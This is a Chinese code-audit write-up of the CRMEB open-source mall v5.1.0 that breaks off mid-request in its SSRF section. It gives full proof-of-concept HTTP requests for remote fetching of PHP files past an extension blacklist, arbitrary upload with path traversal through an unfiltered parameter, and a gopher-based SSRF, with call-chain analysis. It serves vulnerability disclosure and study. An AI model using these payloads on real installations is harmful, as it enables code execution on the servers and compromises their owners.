---
title: CRMEB开源版v5.1.0代码审计
date: '2024-04-30 10:23:24'
updated: '2024-09-23 21:57:17'
---
<!--more--> 
# 0x00 前言
<font style="color:rgb(64, 72, 91);">CRMEB开源商城系统是一款全开源可商用的系统，由</font><font style="color:rgb(85, 85, 85);">西安众邦网络科技有限公司开发并发布开源版本。</font>

<font style="color:rgb(85, 85, 85);">西安众邦网络科技有限公司是一家致力于互联网软件设计、研发、销售为一体的高新技术企业。自2014年成立以来，众邦科技将客户关系管理与电子商务应用场景进行深度集成，围绕新零售、智慧商业、企业数字化经营等课题进行探索创新，打造出中国私有化独立应用电商软件知名品牌——CRMEB。</font>

<font style="color:rgb(85, 85, 85);">本篇讲述了PHP代码审计过程中发现的一写漏洞，从反序列化、文件操作、用户认证凭据等方面展开审查，发现不少漏洞问题，小弟在此抛砖引玉。</font>

# 0x01 声明
公网上存在部署了旧版本的CMS，旧版本仍然存在这些问题。

请不要非法攻击别人的服务器，如果你是服务器主人请升级到最新版本。

请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。  
一切未经授权的网络攻击均为违法行为，互联网非法外之地。

# 0x02 环境
系统版本：CRMEB开源版v5.1.0

系统环境：Window11

PHP版本：7.4.3NTS

数据库版本：5.7.26

Web服组件务：Nginx1.15.11

源码下载地址：[https://gitee.com/ZhongBangKeJi/CRMEB/releases/tag/v5.1.0](https://gitee.com/ZhongBangKeJi/CRMEB/releases/tag/v5.1.0)

# 0x03 安装
官方教程：[https://doc.crmeb.com/single/crmeb_v4/921](https://doc.crmeb.com/single/crmeb_v4/921)

# 0x04 代码审计
## 【高危】后台远程任意文件拉取（添加直播商品功能）
### 漏洞详情
导致该漏洞产生的问题在于没有对拉取文件后缀进行严格校验，使用黑名单进行匹配是非常不安全的。主要漏洞入口点在实现获取直播商品封面、直播间封面等功能上，不安全的使用`readfile`函数。

### 漏洞复现
准备一个命名为`help.PHP`的文件，内容如下：

```plain
<?=phpinfo();?>
```

使用 python 开启简单 http 服务，`python -m http.server 19000`

![](../../images/posts/6626ceb92c828955d02d6670c47c933d.png)

_注意服务名和端口，需要自行替换_。

访问后台：`http://localhost:45600/admin`

输入安装时设置好的账号密码登录后台，从左侧栏进入路径`营销->直播管理->直播商品管理`。

`http://localhost:45600/admin/marketing/live/add_live_goods`

![](../../images/posts/6033084e9db8058afa8f1f45c4108c31.png)

完成步骤：`点击添加商品->任意添加商品->生成直播商品`，在点击提交功能时进行抓包。

![](../../images/posts/af07e2fc6231123dfc8335cb1dec2ac5.png)

原始请求数据包：

![](../../images/posts/6827aa97179fe545c256517a5795c7e4.png)

替换其中`image`参数为`http://localhost:19000/help.PHP`并进行发包。可以看到数据包发送后，虽然返回400，实际上已经请求并拉取了`help.PHP`文件。

![](../../images/posts/7adc7c2145545ea2da35afa79e6b198c.png)

POC数据包：

```plain
POST /adminapi/live/goods/add HTTP/1.1
Host: localhost:45600
Content-Length: 206
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:45600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/marketing/live/add_live_goods
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"goods_info":[{"id":4,"image":"http://localhost:19000/help.PHP","store_name":"Apple/苹果iPad mini6 8.3英寸平板电脑 64G-WLAN版 深空灰色","price":"3999.00","cost_price":"3999.00","stock":1600}]}
```

访问 [https://cmd5.com/hash.aspx](https://cmd5.com/hash.aspx) 将 URL`http://localhost:19000/help.PHP` 进行 MD5 编码，得到`749aa9192a0f6ff0ed7c34418e6fe97f`

![](../../images/posts/ced38d5fbf05f83de2fac952256cb0a0.png)

根据默认文件路径规则构造URL：

`http://localhost:45600/uploads/attach/{年份}/{月份}/{日号}/{URL的MD5值}.PHP`

得到：

`http://localhost:45600/uploads/attach/2023/09/07/749aa9192a0f6ff0ed7c34418e6fe97f.PHP`

![](../../images/posts/b10e9c0c76f4d4e36c818b41c1ae01d1.png)

需要注意的是：

1. 使用 apache Web服务器软件下只能解析 php 后缀文件。
2. 使用 nginx Web服务器软件下，在Windows和MacOS系统中不区分大小写匹配。

如果 apache 想要解析大写PHP后缀或者其他后缀，需要添加下面这行代码。

![](../../images/posts/0eaf03eec7962a589b00120f45d381da.png)

在 nginx 配置中，`~`默认是区分大小写的，如果需要忽略大小写就要使用 `~*`。但在Windows和MacOS系统中不区分，Linux系统区分。

![](../../images/posts/0b40c7daaf4ac916089c9353fdb3c627.png)

### 漏洞审计
利用链路：

```plain
adminapi/controller/v1/marketing/live/LiveGoods.php add 78行
  services/activity/live/LiveGoodsServices.php add 94行 
    	utils/DownloadImage.php downloadImage 99行
        	services/upload/storage/Local.php down 198行
```

导致漏洞产生的危险函数`readfile`，位于`utils/DownloadImage.php`第99行。

![](../../images/posts/2c96987535a7e70b11eee212407f0590.png)

流程函数为`downloadImage`，接受两个形参，其中`$url`最终传入`readfile`。在此之前存在一个条件判断，用黑名单校验文件后缀。

只是简单使用`in_array`来判断后缀名是否是`['php', 'js', 'html']`，如果是，就退出。**所以无论我们是使用大小写还是**`**::DATA**`**等方式进行绕过都是可以的。**

```plain
if (in_array($ext, ['php', 'js', 'html'])) {
    throw new AdminException(400558);
}
```

![](../../images/posts/45125333793cf0e3e56608ab849ecb40.png)

文件名和后缀都是通过`<font style="color:#080808;">getImageExtname</font>`<font style="color:#080808;">函数获取的，位于</font>`<font style="color:#080808;">utils/DownloadImage.php</font>`<font style="color:#080808;">第50行。</font>

1. <font style="color:#080808;">去掉URL中</font>`<font style="color:#080808;">?</font>`<font style="color:#080808;">之后的部分</font>
2. <font style="color:#080808;">通过</font>`<font style="color:#080808;">.</font>`<font style="color:#080808;">分割URL，取最后一个数组成员。</font>

<font style="color:#080808;">假设我们输入</font>`<font style="color:#080808;">http://localhost:19000/help.PHP?a=1&b=1</font>`

<font style="color:#080808;">那么到了第62行时</font>`<font style="color:#080808;">$ext_name</font>`<font style="color:#080808;">的值为</font>`<font style="color:#080808;">PHP</font>`<font style="color:#080808;">，</font>`<font style="color:#080808;">$url</font>`<font style="color:#080808;">的值为</font>`<font style="color:#080808;">http://localhost:19000/help.PHP</font>`

<font style="color:#080808;">这里的文件名并不是随机产生的，而是通过对我们输入的URL进行md5编码。相当于：</font>

`<font style="color:#080808;">md5(http://localhost:19000/help.PHP).PHP</font>`

![](../../images/posts/ac4a30c3d4e610c6e55cca4ae781448b.png)

回头看`downloadImage`函数，在`readfile`远程读取完文件内容后，进入`down`函数来保存文件。

![](../../images/posts/0244acd7b340becea16da046f1905a53.png)

`down`函数位于`services/upload/storage/Local.php`第198行。最终使用`<font style="color:#080808;">file_put_contents</font>`<font style="color:#080808;">来保存文件。</font>

![](../../images/posts/a77ab19157922cc0a50d005e275fcbf7.png)

`downloadImage`函数存在7个用法，其中2个都属于营销直播内的功能点。

![](../../images/posts/07b32ecd06d7202d5ab96a3ce2e4bbec.png)

<font style="color:#080808;background-color:#ffffff;">添加直播</font><font style="color:#080808;">商品</font>功能点函数`add`，位于`services/activity/live/LiveGoodsServices.php`第94行。传入`<font style="color:#080808;">downloadImage</font>`<font style="color:#080808;">函数的URL是通过形参</font>`<font style="color:#080808;">$goods_info</font>`<font style="color:#080808;">传入的。</font>

![](../../images/posts/6d0c6d34b5206b5c92dcd5981943289a.png)

继续向上寻找到调用方法`<font style="color:#080808;">add</font>`，位于`adminapi/controller/v1/marketing/live/LiveGoods.php`第78行

![](../../images/posts/dc11736533eaa3b81848e051dd8f9b3e.png)

在`adminapi/route/live.php`中可以找到对应路由：

![](../../images/posts/e9a632fc3794e8ae1c11b7ad624a3507.png)

## 【高危】后台远程任意文件拉取（网络图片上传功能）
### 漏洞详情
导致该漏洞产生的问题在于没有对拉取文件后缀进行严格校验，使用黑名单进行匹配是非常不安全的。主要漏洞入口点在网络图片上传功能上，不安全的使用`readfile`函数。

### 漏洞复现
准备一个命名为`help.PHP`的文件，内容如下：

```plain
<?=phpinfo();?>
```

使用 python 开启简单 http 服务，`python -m http.server 19000`

![](../../images/posts/6626ceb92c828955d02d6670c47c933d.png)

_注意服务名和端口，需要自行替换_。

访问后台：`http://localhost:45600/admin`

输入安装时设置好的账号密码登录后台，从左侧栏进入路径`商品->商品管理->添加商品`

`http://localhost:45600/admin/product/add_product`

![](../../images/posts/859c6c5f942cb1022d64bb1aefc04277.png)

完成步骤：`点击商品轮播图->在上传商品图窗口点击上传图片`

![](../../images/posts/52562ddf1595722cbd036a7564c96fbc.png)

完成步骤：`在上传图片窗口点击网络上传选项->点击提取图片->点击确定`

![](../../images/posts/3745bdcf32fc74c4593e87dbef22b738.png)

上传后可以在上传商品图找到文件路径。

![](../../images/posts/d47a7d1a6ce5c07c52e29cf11f81747b.png)

也可以通过观察

`http://localhost:45600/adminapi/file/file?pid=&real_name=&page=1&limit=18`

接口返回的数据中找到文件访问路径。

![](../../images/posts/737ab8f5f3bd1a63b0521322c723eb69.png)

POC数据包：

```plain
POST /adminapi/file/online_upload HTTP/1.1
Host: localhost:45600
Content-Length: 55
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:45600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/marketing/live/add_live_room
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cb_lang=zh-cn; PHPSESSID=23b220209fa9cd4879a5173dc74c2bba; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k; expires_time=1696648920; WS_ADMIN_URL=ws://localhost:45600/notice; WS_CHAT_URL=ws://localhost:45600/msg
Connection: close

{"pid":"","images":["http://localhost:19000/help.PHP"]}
```

访问

`http://localhost:45600/uploads/attach/2023/09/07/749aa9192a0f6ff0ed7c34418e6fe97f.PHP`

![](../../images/posts/3bd4676ed78fe72257ae54b5f89d8703.png)

### 漏洞审计
利用链路：

```plain
adminapi/controller/v1/file/SystemAttachment.php onlineUpload 198行
	services/system/attachment/SystemAttachmentServices.php onlineUpload  311行
    	services/product/product/CopyTaobaoServices.php downloadImage 311行
        	services/upload/storage/Local.php steam 167行
```

导致漏洞产生的危险函数`readfile`，位于`services/product/product/CopyTaobaoServices.php`第311行。

![](../../images/posts/8a6b0ed45108e7699052957555a4dbc9.png)

流程函数为`downloadImage`，接受七个形参，但实际上只使用了`$url`，最终传入`readfile`。在此之前存在一个条件判断，用黑名单校验文件后缀。

只是简单使用`in_array`来判断后缀名是否是`['php', 'js', 'html']`，如果是，就退出。**所以无论我们是使用大小写还是**`**::DATA**`**等方式进行绕过都是可以的。**

```plain
if (in_array($ext, ['php', 'js', 'html'])) {
    throw new AdminException(400558);
}
```

![](../../images/posts/b57e4223b44bc5b4160b86f6a6d76465.png)

文件名和后缀都是通过`<font style="color:#080808;">getImageExtname</font>`<font style="color:#080808;">函数获取的，位于</font>`<font style="color:#080808;">services/product/product/CopyTaobaoServices.php</font>`<font style="color:#080808;">第342行。</font>

1. <font style="color:#080808;">去掉URL中</font>`<font style="color:#080808;">?</font>`<font style="color:#080808;">之后的部分</font>
2. <font style="color:#080808;">通过</font>`<font style="color:#080808;">.</font>`<font style="color:#080808;">分割URL，取最后一个数组成员。</font>

<font style="color:#080808;">假设我们输入</font>`<font style="color:#080808;">http://localhost:19000/help.PHP?a=1&b=1</font>`

<font style="color:#080808;">那么到了第353行时</font>`<font style="color:#080808;">$ext_name</font>`<font style="color:#080808;">的值为</font>`<font style="color:#080808;">PHP</font>`<font style="color:#080808;">，</font>`<font style="color:#080808;">$url</font>`<font style="color:#080808;">的值为</font>`<font style="color:#080808;">http://localhost:19000/help.PHP</font>`

<font style="color:#080808;">这里的文件名并不是随机产生的，而是通过对我们输入的URL进行md5编码。相当于：</font>

`<font style="color:#080808;">md5(http://localhost:19000/help.PHP).PHP</font>`

![](../../images/posts/b5e529c3bc481128908d472e38b87b63.png)

回头看`downloadImage`函数，在`readfile`远程读取完文件内容后，进入`stream`函数来保存文件。

![](../../images/posts/c5ad62226fde725879c3164252434cbf.png)

`stream`函数位于`services/upload/storage/Local.php`第167行。最终使用`<font style="color:#080808;">file_put_contents</font>`<font style="color:#080808;">来保存文件。</font>

![](../../images/posts/808ed611cfd5475d8c3fd1ff94f52a91.png)

网络图片上传功能点函数`onlineUpload`，位于`services/system/attachment/SystemAttachmentServices.php`第311行。传入`<font style="color:#080808;">downloadImage</font>`<font style="color:#080808;">函数的URL是通过形参</font>`<font style="color:#080808;">$data</font>`<font style="color:#080808;">传入的。</font>

![](../../images/posts/f1567a119443e27bfd8e25162f33ae57.png)

继续向上寻找到调用方法`<font style="color:#080808;">onlineUpload</font>`，位于`adminapi/controller/v1/file/SystemAttachment.php`第198行

![](../../images/posts/52aff878d7d4a80071b48059283529f2.png)

从`adminapi/route/file.php`可以找到对应路由：

![](../../images/posts/7cae81be9769825e5f747d1e67216f8f.png)

## 【高危】后台远程任意文件拉取（添加商品）
### 漏洞详情
导致该漏洞产生的问题在于没有对拉取文件后缀进行严格校验，使用黑名单进行匹配是非常不安全的。主要漏洞入口点在添加商品功能上，不安全的使用`readfile`函数。

### 漏洞复现
准备一个命名为`help.PHP`的文件，内容如下：

```plain
<?=phpinfo();?>
```

使用 python 开启简单 http 服务，`python -m http.server 19000`

![](../../images/posts/6626ceb92c828955d02d6670c47c933d.png)

_注意服务名和端口，需要自行替换_。

访问后台：`http://localhost:45600/admin`

输入安装时设置好的账号密码登录后台，从左侧栏进入路径`商品->商品管理->添加商品`

`http://localhost:45600/admin/product/add_product`

![](../../images/posts/859c6c5f942cb1022d64bb1aefc04277.png)

**步骤一**

填写商品基础信息，任意填写。

![](../../images/posts/b1e746575804afebbc7497359c0b9a8f.png)

**步骤二**

1. 进入商品详情界面，点击编辑器的HTML按钮。
2. 填写payload

```plain
<img src="http://localhost:19000/help.PHP?233">
```

![](../../images/posts/95dbf602c90ba410b46aa0b99f10dcb3.png)

![](../../images/posts/c8e467d637b4d968828139db88c66b90.png)

**步骤三**

进入其他设置选项，点击保存并抓包。

![](../../images/posts/c4779ee9aa357912a06b9cdffd05a47f.png)

原始数据包：

![](../../images/posts/a8765ce66ceed37c65db988dfb6697b9.png)

修改`slider_image`和`attrs`的值为`http://localhost:19000/help.PHP`。这里添加了`?123`是为了方便判断请求。

![](../../images/posts/28f8f2b154194f1d144df27347c27a4a.png)

同时修改`type`的值为`-1`后进行发包，观察HTTP服务，可以看到这三个地方都触发了远程文件拉取。

![](../../images/posts/471584c14a1108eb809a5157808cfd00.png)

访问 [https://cmd5.com/hash.aspx](https://cmd5.com/hash.aspx) 将 URL`http://localhost:19000/help.PHP` 进行 MD5 编码，得到`749aa9192a0f6ff0ed7c34418e6fe97f`

![](../../images/posts/ced38d5fbf05f83de2fac952256cb0a0.png)

根据默认文件路径规则构造URL：

`http://localhost:45600/uploads/attach/{年份}/{月份}/{日号}/{URL的MD5值}.PHP`

得到：

`http://localhost:45600/uploads/attach/2023/09/07/749aa9192a0f6ff0ed7c34418e6fe97f.PHP`

![](../../images/posts/b10e9c0c76f4d4e36c818b41c1ae01d1.png)

也可以通过观察

`http://localhost:45600/adminapi/file/file?pid=&real_name=&page=1&limit=18`

接口返回的数据中找到文件访问路径。

![](../../images/posts/737ab8f5f3bd1a63b0521322c723eb69.png)

### 漏洞审计
利用链路：

```plain
adminapi/controller/v1/product/StoreProduct.php save 243行
	services/product/product/StoreProductServices.php save  506行
  	services/product/product/CopyTaobaoServices.php downloadCopyImage 392行
      	services/product/product/CopyTaobaoServices.php downloadImage 311行
          	services/upload/storage/Local.php steam 167行
```

导致漏洞产生的危险函数`readfile`，位于`services/product/product/CopyTaobaoServices.php`第311行。

![](../../images/posts/8a6b0ed45108e7699052957555a4dbc9.png)

流程函数为`downloadImage`，接受七个形参，但实际上只使用了`$url`，最终传入`readfile`。在此之前存在一个条件判断，用黑名单校验文件后缀。

只是简单使用`in_array`来判断后缀名是否是`['php', 'js', 'html']`，如果是，就退出。**所以无论我们是使用大小写还是**`**::DATA**`**等方式进行绕过都是可以的。**

```plain
if (in_array($ext, ['php', 'js', 'html'])) {
    throw new AdminException(400558);
}
```

![](../../images/posts/b57e4223b44bc5b4160b86f6a6d76465.png)

文件名和后缀都是通过`<font style="color:#080808;">getImageExtname</font>`<font style="color:#080808;">函数获取的，位于</font>`<font style="color:#080808;">services/product/product/CopyTaobaoServices.php</font>`<font style="color:#080808;">第342行。</font>

1. <font style="color:#080808;">去掉URL中</font>`<font style="color:#080808;">?</font>`<font style="color:#080808;">之后的部分</font>
2. <font style="color:#080808;">通过</font>`<font style="color:#080808;">.</font>`<font style="color:#080808;">分割URL，取最后一个数组成员。</font>

<font style="color:#080808;">假设我们输入</font>`<font style="color:#080808;">http://localhost:19000/help.PHP?a=1&b=1</font>`

<font style="color:#080808;">那么到了第353行时</font>`<font style="color:#080808;">$ext_name</font>`<font style="color:#080808;">的值为</font>`<font style="color:#080808;">PHP</font>`<font style="color:#080808;">，</font>`<font style="color:#080808;">$url</font>`<font style="color:#080808;">的值为</font>`<font style="color:#080808;">http://localhost:19000/help.PHP</font>`

<font style="color:#080808;">这里的文件名并不是随机产生的，而是通过对我们输入的URL进行md5编码。相当于：</font>

`<font style="color:#080808;">md5(http://localhost:19000/help.PHP).PHP</font>`

![](../../images/posts/b5e529c3bc481128908d472e38b87b63.png)

回头看`downloadImage`函数，在`readfile`远程读取完文件内容后，进入`stream`函数来保存文件。

![](../../images/posts/c5ad62226fde725879c3164252434cbf.png)

`stream`函数位于`services/upload/storage/Local.php`第167行。最终使用`<font style="color:#080808;">file_put_contents</font>`<font style="color:#080808;">来保存文件。</font>

![](../../images/posts/808ed611cfd5475d8c3fd1ff94f52a91.png)

观察`downloadImage`函数调用处在`<font style="color:#080808;">downloadCopyImage</font>`<font style="color:#080808;">函数内，位于</font>`<font style="color:#080808;">services/product/product/CopyTaobaoServices.php</font>`<font style="color:#080808;">第392行。这里的</font>`<font style="color:#080808;">$image</font>`<font style="color:#080808;">变量没有校验直接传入</font>`<font style="color:#080808;">downloadImage</font>`<font style="color:#080808;">函数中。</font>

![](../../images/posts/975679ee47706d055c2dfdb2d6cf8abc.png)

找到三处调用`<font style="color:#080808;">downloadCopyImage</font>`<font style="color:#080808;">函</font>数的`save`方法，位于`services/product/product/StoreProductServices.php`第506行。

![](../../images/posts/3f247524b5d824dd247d261b31f11e5f.png)

`save`函数接收两个形参，POST的数据通过`$data`传入。其中进入`<font style="color:#080808;">downloadCopyImage</font>`<font style="color:#080808;">函数前有一个判断</font>`<font style="color:#080808;">$type == -1</font>`<font style="color:#080808;">的判断，只需要确保他的校验通过即可。</font>

![](../../images/posts/868fe7c34f59a9d2a85bcc1ecc4ca25c.png)

进一步向上寻找到调用方法`save`，位于`adminapi/controller/v1/product/StoreProduct.php`第243行。这里确定了`id`必须为`int`类型，同时将POST参数传入`StoreProductServices.php`的`save`函数中去。

![](../../images/posts/b1d5a12083fe736101a3ae00b7c232e2.png)

从`adminapi/route/product.php`可以找到对应路由：

![](../../images/posts/43823b10f95bb336e3886ed6823fe721.png)

## 【高危】后台任意文件上传（视频上传功能）
### 漏洞详情
导致该漏洞产生的问题在于没有对上传文件后缀进行严格校验，对文件名进行了白名单校验，但路径拼接时使用了未经验证的数据进行拼接。主要功能点为视频上传功能，不安全的使用`<font style="color:#080808;">move_uploaded_file</font>`<font style="color:#080808;">危险函数。</font>

### 漏洞复现
_注意服务名和端口，需要自行替换_。

访问后台：`http://localhost:45600/admin`

输入安装时设置好的账号密码登录后台，从左侧栏进入路径`商品->商品管理->添加商品`

`http://localhost:45600/admin/cms/article/add_article`

![](../../images/posts/b5a17667b87a6c9b901036a051dd901c.png)

完成步骤：`点击文章内容编辑器的上传视频按钮->任意上传MP4后缀文件->点击确定`，在点击提交功能时进行抓包。![](../../images/posts/4af05e1fe1321390bccc25be7efadcab.png)

原始请求数据包：

![](../../images/posts/38b1576a9edbd002fc1e0b0c04edc42d.png)

修改`chunkNumber`参数为`.php`，修改`blob`参数为PHP代码：`<?=phpinfo();?>`

![](../../images/posts/e372c3c7cf68946071d654f25ec8ad58.png)

POC数据包：

```plain
POST /adminapi/file/video_upload?XDEBUG_SESSION_START=13429 HTTP/1.1
Host: localhost:45600
Content-Length: 842
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBCTWThi2iCHWlO8M
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:45600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/cms/article/add_article
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cb_lang=zh-cn; PHPSESSID=23b220209fa9cd4879a5173dc74c2bba; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k; expires_time=1696648920; WS_ADMIN_URL=ws://localhost:45600/notice; WS_CHAT_URL=ws://localhost:45600/msg;XDEBUG_SESSION_START=13429;
Connection: close

------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="chunkNumber"

.php
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="chunkSize"

3145728
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="currentChunkSize"

52
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/octet-stream

<?=phpinfo();?>
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="filename"

token.mp4
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="totalChunks"

1
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="md5"

6a2d9342b9afb96e10fef23910e0e1eb
------WebKitFormBoundaryBCTWThi2iCHWlO8M--

```

文件路径规则为

`http://localhost:45600/uploads/attach/${年份}/${月份}/${日号}/${filename}__.php`

得到

`http://localhost:45600/uploads/attach/2023/09/07/token.mp4__.php`

![](../../images/posts/ea986a1bd4a55218e024657010187373.png)

通过给`filename`添加路径穿越符号可以上传到上层目录，或者指定目录。

![](../../images/posts/f4a46f33469c78b4d3c9a0846c49851d.png)

发送后上传到了 uploads 文件夹下，完成了路径穿越攻击。

![](../../images/posts/5361098164eaf880ba26ad8497dff4f6.png)

### 漏洞审计
利用链路：

```plain
services/system/attachment/SystemAttachmentServices.php videoUpload 261行
  	adminapi/controller/v1/file/SystemAttachment.php videoUpload 136行
```

危险函数`<font style="color:#080808;">move_uploaded_file</font>`<font style="color:#080808;">位于</font>`<font style="color:#080808;">services/system/attachment/SystemAttachmentServices.php</font>`第261行。流程函数`<font style="color:#080808;">videoUpload</font>`<font style="color:#080808;">，接受两个形参：</font>

1. `<font style="color:#080808;">$data</font>`<font style="color:#080808;">记录POST请求参数（form-data）</font>
2. `<font style="color:#080808;">$file</font>`<font style="color:#080808;">记录请求中的文件（application/octet-stream）</font>

![](../../images/posts/7f38c5aa84f1c68f253256972611088a.png)

这里对请求参数`filename`进行了白名单校验。必须要有后缀名，且后缀在白名单之内。`token.mp4`显然符合这个条件。

```plain
if (isset($pathinfo['extension']) && !in_array($pathinfo['extension'], ['avi', 'mp4', 'wmv', 'rm', 'mpg', 'mpeg', 'mov', 'flv', 'swf'])) {
    throw new AdminException(400558);
}
```

在进行路径拼接时使用了`$data['filename']`和`$data['chunkNumber']`。`filename`经过了过滤，但是`chunkNumber`没有。这个参数就是污染点，可以传入`.php`。

```plain
$filename = $all_dir . '/' . $data['filename'] . '__' . $data['chunkNumber'];
move_uploaded_file($file['tmp_name'], $filename);
```

`<font style="color:#080808;">$data['filename']</font>`<font style="color:#080808;">不是通过封装类获取，且只进行了后缀校验，没有过滤路径穿越的问题，导致我们可以任意上传任意文件到任意目录下。</font>

![](../../images/posts/b0e7d4aeaf5e2172b14ec5783367c854.png)

向上寻找到调用方法`videoUpload`，位于`adminapi/controller/v1/file/SystemAttachment.php`第136行。这里写明`$data`是从POST请求体内容获取的，这里没有进行数据类型校验。

![](../../images/posts/93727b3ff29083b8c1e589f3e38a415a.png)

从`adminapi/route/file.php`可以找到对应路由：

![](../../images/posts/f42d95e289d1ae93c621b631940ab369.png)

## 【中危】前台SSRF（<font style="color:#080808;background-color:#ffffff;">获取图片base64功能</font>） 
### 漏洞详情
在实现远程<font style="color:#080808;background-color:#ffffff;">获取图片base64功能上，不安全的使用了</font>`<font style="color:rgb(64, 72, 91);">curl_exec</font>`<font style="color:rgb(64, 72, 91);">函数。没有对传入的URL进行严格过滤，</font>`<font style="color:rgb(64, 72, 91);">curl_exec</font>`<font style="color:rgb(64, 72, 91);">允许多种协议请求，容易忽略解析</font>`<font style="color:rgb(64, 72, 91);">?</font>`<font style="color:rgb(64, 72, 91);">、</font>`<font style="color:rgb(64, 72, 91);">#</font>`<font style="color:rgb(64, 72, 91);">从而绕过安全校验。</font>

### 漏洞复现
使用gopher协议发送请求：

![](../../images/posts/04ab8e863ebd44db1144406609469de9.png)

需要替换 code 为payload，如果没有接收到请求，将 payload 替换到 image 变量也是可以的。

POC请求包：

```plain
POST /api/image_base64 HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
